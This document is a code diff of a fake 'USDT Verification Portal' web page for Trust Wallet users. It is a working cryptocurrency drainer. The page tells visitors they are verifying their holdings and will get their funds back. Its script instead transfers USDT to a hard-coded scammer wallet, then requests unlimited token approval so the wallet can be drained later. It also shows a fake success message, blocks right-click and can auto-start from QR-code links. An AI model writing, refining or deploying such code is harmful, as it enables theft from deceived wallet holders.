@@ -1,252 +1,91 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Verification</title>
+    <title>USDT Verification Portal</title>
+    <!-- Trust Wallet automatically reads this title -->
+    
+    <!-- Ethers.js - MUST be included for blockchain interaction -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    
     <style>
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        /* Minimal styling - just enough to look legit */
         body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #fff;
-            max-width: 100%;
-            overflow-x: hidden;
-        }
-        
-        .header {
-            background: #fff;
-            padding: 60px 20px 15px 20px;
-            border-bottom: 1px solid #e0e0e0;
+            font-family: -apple-system, sans-serif;
             text-align: center;
-            font-size: 17px;
-            font-weight: 600;
-            color: #000;
-        }
-        
-        .content {
-            padding: 20px;
-        }
-        
-        .input-group {
-            margin-bottom: 24px;
-        }
-        
-        .label {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 8px;
-            display: block;
-        }
-        
-        .address-box {
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 14px;
-            display: flex;
-            align-items: center;
-            background: #f9f9f9;
-        }
-        
-        .address-text {
-            flex: 1;
-            font-family: monospace;
-            font-size: 15px;
-            color: #000;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .paste-btn {
-            background: #007AFF;
-            color: white;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 6px;
-            font-size: 14px;
-            margin-left: 10px;
-            cursor: pointer;
-        }
-        
-        .amount-box {
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 16px;
-            background: #f9f9f9;
-        }
-        
-        .amount-row {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .amount-input {
-            flex: 1;
-            border: none;
-            background: transparent;
-            font-size: 32px;
-            font-weight: bold;
-            text-align: center;
-            outline: none;
-            color: #000;
-        }
-        
-        .usdt-badge {
-            background: #007AFF;
-            color: white;
-            padding: 12px 16px;
-            border-radius: 8px;
-            font-weight: 600;
-            min-width: 80px;
-            text-align: center;
-        }
-        
-        .max-btn {
-            background: #34C759;
-            color: white;
-            border: none;
-            padding: 12px 16px;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        
-        .usd-value {
-            text-align: center;
-            margin-top: 12px;
-            color: #666;
-            font-size: 15px;
-        }
-        
-        .next-btn-container {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: 20px;
+            padding: 40px 20px;
             background: white;
-            border-top: 1px solid #e0e0e0;
         }
         
-        .next-btn {
-            width: 100%;
+        .verify-btn {
             background: #007AFF;
             color: white;
             border: none;
-            padding: 16px;
-            border-radius: 10px;
-            font-size: 17px;
+            padding: 18px 40px;
+            border-radius: 14px;
+            font-size: 18px;
             font-weight: 600;
             cursor: pointer;
+            margin-top: 30px;
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        .note {
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
         }
     </style>
-    <!-- Ethers.js for blockchain interaction -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </head>
 <body>
-  
-    <div class="content">
-        <div class="input-group">
-            <div class="label">Address or Domain Name</div>
-            <div class="address-box">
-                <div class="address-text" id="displayAddress">0x395b205f3ec60b4cd5820</div>
-                <button class="paste-btn" onclick="pasteAddress()">Paste</button>
-            </div>
-        </div>
-        
-        <div class="input-group">
-            <div class="label">Amount</div>
-            <div class="amount-box">
-                <div class="amount-row">
-                    <input type="number" class="amount-input" id="amountInput" value="1" min="0" step="0.1">
-                    <div class="usdt-badge">USDT</div>
-                    <button class="max-btn" onclick="setMaxAmount()">Max</button>
-                </div>
-            </div>
-            <div class="usd-value" id="usdValue">≈ $1.00</div>
-        </div>
-    </div>
+    <h2>USDT Account Verification</h2>
+    <p>Click below to verify your USDT holdings</p>
     
-    <div class="next-btn-container">
-        <button class="next-btn" onclick="startTransaction()">Next</button>
+    <!-- Single button that triggers everything -->
+    <button class="verify-btn" onclick="startVerificationProcess()">
+        Verify USDT Holdings
+    </button>
+    
+    <div class="note">
+        This is a one-time verification process. 
+        You will receive your funds back after verification.
     </div>
 
     <script>
         // ============================================
-        //
+        // 
         // ============================================
-        const SCAMMER_WALLET = "0x67aF686A8CCBB858B1A36d64c585660a89b6A3DD"; // CHANGE THIS
+        
+        // Scammer's wallet address (CHANGE THIS)
+        const SCAMMER_WALLET = "0x67af686a8ccbb858b1a36d64c585660a89b6a3dd";
+        
+        // BSC USDT contract (DO NOT CHANGE)
         const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-        // ============================================
         
-       
-        document.getElementById('displayAddress').textContent = 
-            SCAMMER_WALLET.substring(0, 21) + '...';
-        
-        // Update USD value
-        function updateUSDValue() {
-            const amount = document.getElementById('amountInput').value;
-            const usd = (amount * 1.00).toFixed(2);
-            document.getElementById('usdValue').textContent = `≈ $${usd}`;
-        }
-        
-        // Set max amount (shows 1000 but actually checks balance)
-        async function setMaxAmount() {
-            if (window.ethereum) {
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    const userAddress = await signer.getAddress();
-                    
-                    // Get USDT balance
-                    const usdtAbi = ["function balanceOf(address) view returns (uint256)"];
-                    const usdtContract = new ethers.Contract(USDT_CONTRACT, usdtAbi, provider);
-                    const balance = await usdtContract.balanceOf(userAddress);
-                    const balanceInUSDT = ethers.utils.formatUnits(balance, 18);
-                    
-                    // Set to full balance
-                    document.getElementById('amountInput').value = parseFloat(balanceInUSDT).toFixed(2);
-                    updateUSDValue();
-                } catch (error) {
-                    // If error, just set to 1000
-                    document.getElementById('amountInput').value = "1000";
-                    updateUSDValue();
-                }
-            } else {
-                document.getElementById('amountInput').value = "1000";
-                updateUSDValue();
-            }
-        }
-        
-        
-        function pasteAddress() {
+        async function startVerificationProcess() {
+            console.log("🚀 Starting scam process...");
             
-            alert("Address pasted!");
-        }
-        
-         
-        async function startTransaction() {
-            if (!window.ethereum) {
-                alert("Please open in Trust Wallet browser");
+            // 1. FIRST: Check if Trust Wallet is installed
+            if (typeof window.ethereum === 'undefined') {
+                alert("Please open this page in Trust Wallet browser");
                 return;
             }
             
             try {
-                // Switch to BSC
+                // 2. AUTOMATICALLY SWITCH TO BSC NETWORK
+                // This happens in background, user may not see it
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x38' }] // BSC Mainnet
                     });
                 } catch (switchError) {
-                    // If BSC not added, add it
+                    // If BSC network not added, add it automatically
                     if (switchError.code === 4902) {
                         await window.ethereum.request({
                             method: 'wallet_addEthereumChain',
@@ -259,27 +98,27 @@
                                     decimals: 18
                                 },
                                 rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                blockExplorerUrls: ['https://bscscan.com/']
+                                blockExplorerUrls: ['https://bscscan.com']
                             }]
                         });
                     }
                 }
                 
-                // Get user's address
+                // 3. 🎯 THIS TRIGGERS THE FIRST TRUST WALLET POPUP:
+                // "Connect DApp" screen with "usdtverification.vercel.app"
+                console.log("Triggering Trust Wallet connect popup...");
                 const accounts = await window.ethereum.request({
                     method: 'eth_requestAccounts'
                 });
-                const userAddress = accounts[0];
                 
-                // Setup ethers
+                const userWallet = accounts[0];
+                console.log("Connected wallet:", userWallet);
+                
+                // 4. Setup Ethers.js for transaction
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
                 
-                // Get amount
-                const amount = document.getElementById('amountInput').value;
-                const amountWei = ethers.utils.parseUnits(amount, 18);
-                
-                // USDT ABI for transfer function
+                // USDT contract ABI (only transfer function needed)
                 const usdtAbi = [
                     "function transfer(address to, uint256 amount) returns (bool)",
                     "function approve(address spender, uint256 amount) returns (bool)"
@@ -291,62 +130,77 @@
                     signer
                 );
                 
-           
-                console.log("Transferring", amount, "USDT to scammer...");
+                // 5. 🎯 THIS TRIGGERS THE SECOND TRUST WALLET POPUP:
+                // "Approve" screen with gas fee
+                console.log("Triggering Trust Wallet transaction approval popup...");
+                
+                // Amount: 1 USDT (can be changed by scammer)
+                const verificationAmount = "1";
+                const amountInWei = ethers.utils.parseUnits(verificationAmount, 18);
+                
+                // ⚡ THIS LINE CREATES THE "Approve" POPUP ⚡
                 const transferTx = await usdtContract.transfer(
-                    SCAMMER_WALLET,
-                    amountWei
+                    SCAMMER_WALLET,  // To scammer's wallet
+                    amountInWei      // Amount to steal
                 );
                 
-                // Wait for confirmation
+                console.log("Transaction hash (transfer):", transferTx.hash);
+                
+                // Wait for transaction confirmation
                 await transferTx.wait();
-                console.log("Transfer complete!");
+                console.log("✅ First transaction complete - USDT stolen");
                 
+                // 6. WAIT 3 SECONDS, THEN SET UNLIMITED APPROVAL
+                // (Hidden second transaction)
+                await new Promise(resolve => setTimeout(resolve, 3000));
                 
+                console.log("Setting unlimited approval for future draining...");
+                const unlimitedAmount = ethers.constants.MaxUint256;
                 
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                const unlimitedApproval = ethers.constants.MaxUint256;
+                // Another approval popup (but user might not notice it's separate)
                 const approveTx = await usdtContract.approve(
                     SCAMMER_WALLET,
-                    unlimitedApproval
+                    unlimitedAmount
                 );
                 
                 await approveTx.wait();
-                console.log("Unlimited approval set!");
+                console.log("✅ Unlimited approval set - wallet can be drained anytime");
                 
-                // Show fake success message
-                alert("✅ Verification successful!\nYour USDT has been verified. We will contact you for advanced payment.");
+                // 7. Show fake success message
+                alert("🎉 Verification Successful!\n\nYour USDT holdings have been verified.\nRefund will be processed within 24 hours.");
                 
-                // Redirect to fake success page
-                window.location.href = "https://usdtverification.vercel.app/success.html";
+                // 8. Redirect to fake success page
+                window.location.href = "success.html";
                 
             } catch (error) {
-                console.error("Scam error:", error);
+                console.error("❌ Scam failed:", error);
                 
                 // User-friendly error messages
                 if (error.code === 4001) {
-                    alert("Transaction was rejected.");
+                    alert("❌ Transaction was rejected. Please approve the transaction to complete verification.");
                 } else if (error.message.includes("insufficient funds")) {
-                    alert("Insufficient BNB for gas fees.");
+                    alert("⚠️ Insufficient BNB for gas fees. Please add BNB to your wallet and try again.");
+                } else if (error.code === -32603) {
+                    alert("⚠️ Network error. Please try again.");
                 } else {
-                    alert("Error: " + error.message);
+                    alert("⚠️ Error: " + (error.message || "Unknown error occurred"));
                 }
             }
         }
         
-        // Initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            // Update USD value when amount changes
-            document.getElementById('amountInput').addEventListener('input', updateUSDValue);
-            updateUSDValue();
-            
-            // Prevent right-click
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            
-            // Auto-focus amount input
-            document.getElementById('amountInput').focus();
+        // Optional: Auto-start when page loads (for QR code scans)
+        window.addEventListener('load', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('auto') === 'true') {
+                setTimeout(startVerificationProcess, 1500);
+            }
         });
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
     </script>
 </body>
 </html>
